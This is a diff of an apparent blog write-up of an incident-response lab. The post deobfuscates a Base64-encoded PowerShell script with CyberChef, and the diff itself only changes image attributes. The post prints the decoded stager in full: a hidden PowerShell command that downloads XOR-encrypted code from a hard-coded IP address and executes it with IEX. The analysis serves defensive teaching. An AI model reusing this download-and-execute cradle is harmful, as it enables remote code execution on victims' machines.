@@ -10,7 +10,7 @@ tags: [Base64, Powershell, Incident Response, Deobfuscate]
 
 Incident response team reported malicious PowerShell code for deobfuscation, seemingly laced with malicious intent. Your mission, should you choose to accept it, is to dissect and analyze this script, unveiling its true nature and potential risks. Dive into the code and reveal its secrets to safeguard our digital realm.
 
-![]({{site.baseurl}}/img/Letsdefence/Powershell IR/Power-shell.png)
+![]({{site.baseurl}}/img/Letsdefence/Powershell IR/Power-shell.png){: width="356" height="237" loading="lazy"}
 
 Deobfuscating the code allows for a deeper understanding of the attacker's techniques and aids in identifying indicators of compromise (IOCs) [Reference: MITRE ATT&CK ](https://attack.mitre.org/techniques/T1140/)
 
@@ -22,11 +22,11 @@ JABXAEMAPQBOAGUAdwAtAE8AYgBqAEUAYwBUACAAUwB5AFMAVABlAE0ALgBOAEUAVAAuAFcAZQBiAEMA
 ```
 The encoded script likely represents Base64 encoding, a common technique used by attackers to obfuscate malicious payloads, Decoding the script using tools like CyberChef can reveal the underlying commands and intentions of the attacker.
 
-![]({{site.baseurl}}/img/Letsdefence/Powershell IR/Base64 decode.png)
+![]({{site.baseurl}}/img/Letsdefence/Powershell IR/Base64 decode.png){: width="1920" height="736" loading="lazy"}
 
 Now that we have decoded the script, we may encounter visual text interspersed with null bytes. These null bytes can be removed using the "Remove Null Bytes" operation in tools like CyberChef.
 
-![]({{site.baseurl}}/img/Letsdefence/Powershell IR/Remove Null bytes.png)
+![]({{site.baseurl}}/img/Letsdefence/Powershell IR/Remove Null bytes.png){: width="1920" height="738" loading="lazy"}
 
 ```powershell
 powershell.exe -NoP -sta -NonI -W Hidden -Enc $WC=New-ObjEcT SySTeM.NET.WebCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADeRS.ADd('User-Agent',$u);$Wc.ProxY = [System.NeT.WEBReQUEst]::DEFAuLtWebProXy;$wc.PROxY.CrEdenTialS = [SysTem.NEt.CRedeNTIAlCAcHE]::DeFAULTNetWOrKCredENTiAls;$K='IM-S&fA9Xu{[)|wdWJhC+!N~vq_12Lty';$i=0;[CHaR[]]$B=([cHaR[]]($wc.DOwNLOaDStriNg("http://98.103.103.170:7443/index.asp")))|%{$_-BXoR$K[$I++%$k.LEnGTH]};IEX ($B-jOIn'')
